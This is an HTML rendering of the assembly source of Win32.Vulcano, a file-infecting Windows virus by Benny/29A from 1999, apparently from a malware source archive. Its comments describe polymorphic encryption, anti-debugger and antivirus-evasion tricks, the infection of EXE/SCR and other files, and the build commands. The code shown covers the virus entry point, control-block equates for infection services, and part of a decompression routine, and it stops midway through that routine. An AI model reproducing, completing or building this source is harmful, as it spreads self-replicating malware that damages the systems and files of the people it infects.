<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.Win32.Vulcano - vulcano.asm.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;                                                     ‹€€€€€‹ ‹€€€€€‹ ‹€€€€€‹</span><span class="sc0">
</span><span class="sc1">;                                                     €€€ €€€ €€€ €€€ €€€ €€€</span><span class="sc0">
</span><span class="sc1">;          Win32.Vulcano                              ‹‹‹€€ﬂ  ﬂ€€€€€€ €€€€€€€</span><span class="sc0">
</span><span class="sc1">;          by Benny/29A                               €€€‹‹‹‹ ‹‹‹‹€€€ €€€ €€€</span><span class="sc0">
</span><span class="sc1">;                                                     €€€€€€€ €€€€€€ﬂ €€€ €€€</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Description</span><span class="sc0">
</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Hello everybody,</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;I was wrong. Not BeGemot, but Vulcano is my best virus :D. It has lot of nice</span><span class="sc0">
</span><span class="sc1">;and never published features and it is ofcoz, very optimized. I hope u will</span><span class="sc0">
</span><span class="sc1">;like, coz this took me much time to code and even more time to test it. Here</span><span class="sc0">
</span><span class="sc1">;comes a little description of that. Heh, this is my best virus and it has very</span><span class="sc0">
</span><span class="sc1">;small description - I don't know how to better present it than just write</span><span class="sc0">
</span><span class="sc1">;a list of its features. Enjoy it!</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;This virus is:</span><span class="sc0">
</span><span class="sc1">;       -   the first multiprocess Win32 (Win95/98/NT/2k compatible)</span><span class="sc0">
</span><span class="sc1">;           virus with interprocess communication(!!!)</span><span class="sc0">
</span><span class="sc1">;       -   per-process resident multithreaded fast mid-infector</span><span class="sc0">
</span><span class="sc1">;       -   polymorphic using two layers - advanced BPE32 and</span><span class="sc0">
</span><span class="sc1">;           second semi-morpher</span><span class="sc0">
</span><span class="sc1">;       -   compressed using BCE32</span><span class="sc0">
</span><span class="sc1">;       -   heavilly armoured</span><span class="sc0">
</span><span class="sc1">;       -   CRC32 protected</span><span class="sc0">
</span><span class="sc1">;       -   undetectable by any antivirus</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;This virus uses:</span><span class="sc0">
</span><span class="sc1">;       -   Structured Exception Handling</span><span class="sc0">
</span><span class="sc1">;       -   EPO routines (virus patches one imported API)</span><span class="sc0">
</span><span class="sc1">;       -   CRC32 records instead of raw ANSI strings</span><span class="sc0">
</span><span class="sc1">;       -   Anti-* routines</span><span class="sc0">
</span><span class="sc1">;       -   Pentium and undocumented instructions (also in poly decryptor)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;This virus doesn't:</span><span class="sc0">
</span><span class="sc1">;       -   infect system files</span><span class="sc0">
</span><span class="sc1">;       -   infect files which doesn't contain .reloc section</span><span class="sc0">
</span><span class="sc1">;       -   infect small files</span><span class="sc0">
</span><span class="sc1">;       -   enlarge file</span><span class="sc0">
</span><span class="sc1">;       -   contain any payload</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;This virus is able to:</span><span class="sc0">
</span><span class="sc1">;       -   deactivate some AV monitors</span><span class="sc0">
</span><span class="sc1">;       -   infect EXE/SCR/SFX/CPL/DAT/BAK files</span><span class="sc0">
</span><span class="sc1">;       -   overwrite relocations</span><span class="sc0">
</span><span class="sc1">;       -   communicate with other instances of virus</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;And much more. In short words, this virus presents many new hot features never</span><span class="sc0">
</span><span class="sc1">;been published.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Interprocess communication (IPC)</span><span class="sc0">
</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;This is the best part of the virus :). The main idea is: make all actions</span><span class="sc0">
</span><span class="sc1">;in another process. Imagine, virus does nothing. Nothing in actual process.</span><span class="sc0">
</span><span class="sc1">;But if another infected program is running in system, virus will pass control</span><span class="sc0">
</span><span class="sc1">;to that instance of virus. This very difficult stuff is realised by file mapping</span><span class="sc0">
</span><span class="sc1">;mirrored in swap file, mutexes and threads. That code is very optimized, but</span><span class="sc0">
</span><span class="sc1">;unfortunetely, it contains some bugs, which fortunately aren't much visible.</span><span class="sc0">
</span><span class="sc1">;In 99,9999% of all cases u won't see anything suspicious. That's truth.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;What will happen on execution ?</span><span class="sc0">
</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ-</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Virus will (after patched API will be called):</span><span class="sc0">
</span><span class="sc1">;1) Decrypt it's body by polymorphic decryptor</span><span class="sc0">
</span><span class="sc1">;2)     Decompress virus body</span><span class="sc0">
</span><span class="sc1">;3)     Decrypt virus body by 2nd decryptor</span><span class="sc0">
</span><span class="sc1">;4)     Check consistency of virus body by CRC32 - this prevents from setting</span><span class="sc0">
</span><span class="sc1">;   breakpoints</span><span class="sc0">
</span><span class="sc1">;5)     Check for Pentium processor</span><span class="sc0">
</span><span class="sc1">;6)     Find base of Kernel32.dll in memory</span><span class="sc0">
</span><span class="sc1">;7)     Find all needed APIs (using CRC32)</span><span class="sc0">
</span><span class="sc1">;8) Create new thread which will hook some API functions</span><span class="sc0">
</span><span class="sc1">;9) Wait for thread termination</span><span class="sc0">
</span><span class="sc1">;10)    Create/Open the space in swap file and initialize (create new) record</span><span class="sc0">
</span><span class="sc1">;   for IPC</span><span class="sc0">
</span><span class="sc1">;11)    Create new thread for IPC</span><span class="sc0">
</span><span class="sc1">;12)    Jump to host</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;After hooked API call (API manipulating with files) will virus:</span><span class="sc0">
</span><span class="sc1">;1)     Get file name</span><span class="sc0">
</span><span class="sc1">;2)     Check file properties via IPC</span><span class="sc0">
</span><span class="sc1">;3)     Open file, check it and infect it via IPC</span><span class="sc0">
</span><span class="sc1">;4) Call original API (depending on API)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;After hooked API call (ExitProcess, GetLastError, ...) will virus:</span><span class="sc0">
</span><span class="sc1">;1) Check for application level debugger via IPC (if found, process will be</span><span class="sc0">
</span><span class="sc1">;   remotely terminated - veeery nice feature :))</span><span class="sc0">
</span><span class="sc1">;2) Check for system level debugger (SoftICE) via IPC</span><span class="sc0">
</span><span class="sc1">;3) Check for monitors in memory via IPC</span><span class="sc0">
</span><span class="sc1">;4) Find random file</span><span class="sc0">
</span><span class="sc1">;5) Check it via IPC</span><span class="sc0">
</span><span class="sc1">;6) Check and infect it via IPC</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;IPC thread in memory will:</span><span class="sc0">
</span><span class="sc1">;1) Check for new request</span><span class="sc0">
</span><span class="sc1">;2)     Do property action</span><span class="sc0">
</span><span class="sc1">;3)     Pass execution to next thread</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Greetz</span><span class="sc0">
</span><span class="sc1">;ƒƒƒƒƒƒƒ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Darkman/29A.... Finally I finished it! Hope u like it...</span><span class="sc0">
</span><span class="sc1">;       Billy_Bel...... Where r u? Please mail me...</span><span class="sc0">
</span><span class="sc1">;   GriYo.......... U genius!</span><span class="sc0">
</span><span class="sc1">;       flush.......... no, neni to sice tak super jako to vase, ale da se to</span><span class="sc0">
</span><span class="sc1">;           snest, doufam :)</span><span class="sc0">
</span><span class="sc1">;   StarZer0....... Who is Axelle? X-D</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;How to build it</span><span class="sc0">
</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   tasm32 -ml -m9 -q vulcano.asm</span><span class="sc0">
</span><span class="sc1">;   tlink32 -Tpe -c -x -aa -r  vulcano,,, import32</span><span class="sc0">
</span><span class="sc1">;   pewrsec vulcano.exe</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Last notes</span><span class="sc0">
</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Yeah, I'm really happy, coz I finished that. It was very hard to code it and</span><span class="sc0">
</span><span class="sc1">;much harder to debug it. I know it has some small bugs, but I hope u will like</span><span class="sc0">
</span><span class="sc1">;it over the all negative aspects as buggy code is. Please, tell me what do u</span><span class="sc0">
</span><span class="sc1">;think about it on IRC, or by mail. I can provide u binary form and if u want</span><span class="sc0">
</span><span class="sc1">;to have it, then there's nothing easier than contact me on benny@post.cz.</span><span class="sc0">
</span><span class="sc1">;The hardest thing to code was synchronization module. In first versions of</span><span class="sc0">
</span><span class="sc1">;Vulcano I used normal variable as semaphores, but the code was very slow and</span><span class="sc0">
</span><span class="sc1">;buggy. Then I recompiled it with mutexes and it worked much better. However,</span><span class="sc0">
</span><span class="sc1">;there is still code, which I can't and don't want to change.</span><span class="sc0">
</span><span class="sc1">;Last thing: this virus wasn't coded for spreading, but just and ONLY for</span><span class="sc0">
</span><span class="sc1">;education purposes only. It infects only huge files with relocation table</span><span class="sc0">
</span><span class="sc1">;and I hope it is kewl virus without all those spread-features.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;(c) 1999 Benny/29A. Enjoy!</span><span class="sc0">




</span><span class="sc2">.586p</span><span class="sc0">                                           </span><span class="sc1">;why not ;)</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc0">                                     </span><span class="sc1">;FLAT model</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">mz.inc</span><span class="sc0">                                  </span><span class="sc1">;include some important</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">pe.inc</span><span class="sc0">                                  </span><span class="sc1">;include-filez</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">win32api.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">useful.inc</span><span class="sc0">


</span><span class="sc1">;some instructions</span><span class="sc0">
</span><span class="sc5">push_LARGE_0</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">68h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">&gt;</span><span class="sc0">    </span><span class="sc1">;PUSH LARGE 0</span><span class="sc0">
</span><span class="sc6">SALC</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0D6h</span><span class="sc4">&gt;</span><span class="sc0">       </span><span class="sc1">;SALC opcode</span><span class="sc0">
</span><span class="sc5">RDTCS</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">31h</span><span class="sc4">&gt;</span><span class="sc0">   </span><span class="sc1">;RDTCS</span><span class="sc0">


</span><span class="sc1">;some equates for VLCB (VLCB = VuLcano Control Block)</span><span class="sc0">
</span><span class="sc5">VLCB_Signature</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00</span><span class="sc0">          </span><span class="sc1">;signature</span><span class="sc0">
</span><span class="sc5">VLCB_TSep</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">08</span><span class="sc0">          </span><span class="sc1">;record separator</span><span class="sc0">
</span><span class="sc5">VLCB_THandle</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00</span><span class="sc0">          </span><span class="sc1">;mutex handle</span><span class="sc0">
</span><span class="sc5">VLCB_TID</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">04</span><span class="sc0">          </span><span class="sc1">;ID of service</span><span class="sc0">
</span><span class="sc5">VLCB_TData</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">08</span><span class="sc0">          </span><span class="sc1">;data</span><span class="sc0">
</span><span class="sc5">VLCB_TSize</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">SIZEOF_WIN32_FIND_DATA</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc1">;size of one record</span><span class="sc0">
</span><span class="sc5">VLCB_SetWait</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00</span><span class="sc0">          </span><span class="sc1">;set data and wait for result</span><span class="sc0">
</span><span class="sc5">VLCB_WaitGet</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc0">          </span><span class="sc1">;wait for signalisation and get data</span><span class="sc0">
</span><span class="sc5">VLCB_Quit</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc0">          </span><span class="sc1">;quit</span><span class="sc0">
</span><span class="sc5">VLCB_Check</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">02</span><span class="sc0">          </span><span class="sc1">;check file</span><span class="sc0">
</span><span class="sc5">VLCB_Infect</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">03</span><span class="sc0">          </span><span class="sc1">;infect file</span><span class="sc0">
</span><span class="sc5">VLCB_Debug1</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">04</span><span class="sc0">          </span><span class="sc1">;check for app level debugger</span><span class="sc0">
</span><span class="sc5">VLCB_Debug2</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">05</span><span class="sc0">          </span><span class="sc1">;check for SoftICE</span><span class="sc0">
</span><span class="sc5">VLCB_Monitor</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">06</span><span class="sc0">          </span><span class="sc1">;check for AVP and AMON monitors</span><span class="sc0">


</span><span class="sc5">j_api</span><span class="sc0">   </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc5">API</span><span class="sc0">             </span><span class="sc1">;JMP DWORD PTR [XXXXXXXXh]</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">25ffh</span><span class="sc0">
</span><span class="sc5">API</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">


</span><span class="sc5">c_api</span><span class="sc0">   </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc5">API</span><span class="sc0">             </span><span class="sc1">;CALL DWORD PTR [XXXXXXXXh]</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">15ffh</span><span class="sc0">
</span><span class="sc5">API</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">


</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetModuleHandleA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">         </span><span class="sc1">;APIs needed in first</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">              </span><span class="sc1">;generation only</span><span class="sc0">


</span><span class="sc9">.data</span><span class="sc0">                                           </span><span class="sc1">;data section</span><span class="sc0">
</span><span class="sc5">VulcanoInit</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">;Start of virus</span><span class="sc0">
    </span><span class="sc6">SALC</span><span class="sc0">                    </span><span class="sc1">;undoc. opcode to fuck emulators</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_GetModuleHandleA</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;push original API</span><span class="sc0">
</span><span class="sc5">ddAPI</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">400000h</span><span class="sc0">                </span><span class="sc1">;push image base</span><span class="sc0">
</span><span class="sc5">ImgBase</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">                  </span><span class="sc1">;store all registers</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gd</span><span class="sc0">                                 </span><span class="sc1">;get delta offset</span><span class="sc0">
</span><span class="sc5">gd</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                                 </span><span class="sc1">;...</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_compressed_</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gd</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;where is compressed virus</span><span class="sc0">
                                                </span><span class="sc1">;stored</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">decompressed</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gd</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;where will be virus</span><span class="sc0">
                                                </span><span class="sc1">;decompressed</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">              </span><span class="sc1">;size of compressed virus</span><span class="sc0">
</span><span class="sc5">c_size</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">                        


</span><span class="sc1">;Decompression routine from BCE32 starts here.</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">                  </span><span class="sc1">;save all regs</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;EAX = 0</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                </span><span class="sc1">;EBP = 0</span><span class="sc0">
    </span><span class="sc6">cdq</span><span class="sc0">                 </span><span class="sc1">;EDX = 0</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">                   </span><span class="sc1">;load decryption key</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;store it</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">                   </span><span class="sc1">;load first byte</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">                  </span><span class="sc1">;store 8</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                </span><span class="sc1">;store 0</span><span class="sc0">
</span><span class="sc5">d_bits</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                </span><span class="sc1">;store ECX</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">                </span><span class="sc1">;test for 1</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">db0</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0c0h</span><span class="sc0">               </span><span class="sc1">;test for 00</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">db1</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0a0h</span><span class="sc0">               </span><span class="sc1">;test for 010</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">db2</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">               </span><span class="sc1">;its 011</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">tb2</span><span class="sc0">
</span><span class="sc5">testb</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">              </span><span class="sc1">;is it 1 ?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">p1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">;no, store 0</span><span class="sc0">
</span><span class="sc5">_tb_</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                </span><span class="sc1">;load byte to EAX</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;set bit</span><span class="sc0">
    </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">               </span><span class="sc1">;and make space for next one</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">cbit</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">p1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                  </span><span class="sc1">;store 1</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">_tb_</span><span class="sc0">                </span><span class="sc1">;and continue</span><span class="sc0">
</span><span class="sc5">db0</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">              </span><span class="sc1">;CL = 0</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">         </span><span class="sc1">;store 1</span><span class="sc0">
</span><span class="sc5">testbits</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;store it</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                </span><span class="sc1">;...</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;load parameter</span><span class="sc0">
    </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">              </span><span class="sc1">;shift to next bit group</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">testb</span><span class="sc0">              </span><span class="sc1">;test bit</span><span class="sc0">
    </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">               </span><span class="sc1">;next bit</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">testb</span><span class="sc0">              </span><span class="sc1">;test it</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                 </span><span class="sc1">;restore regs</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;load parameter</span><span class="sc0">
</span><span class="sc5">bcopy</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">         </span><span class="sc1">;8. bit ?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">dnlb</span><span class="sc0">                </span><span class="sc1">;nope, continue</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;load next byte</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
